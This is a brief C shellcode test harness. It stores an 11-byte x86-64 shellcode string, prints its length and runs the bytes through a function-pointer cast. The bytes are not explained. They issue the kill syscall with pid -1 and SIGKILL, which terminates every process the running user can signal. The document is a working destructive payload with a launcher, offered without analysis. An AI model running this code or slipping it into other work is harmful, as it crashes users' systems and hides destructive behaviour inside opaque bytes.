#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05";


int main()
{

printf("Shellcode Length:  %d\n", (int)strlen(code));

int (*ret)() = (int(*)())code;

ret();

return 0;
}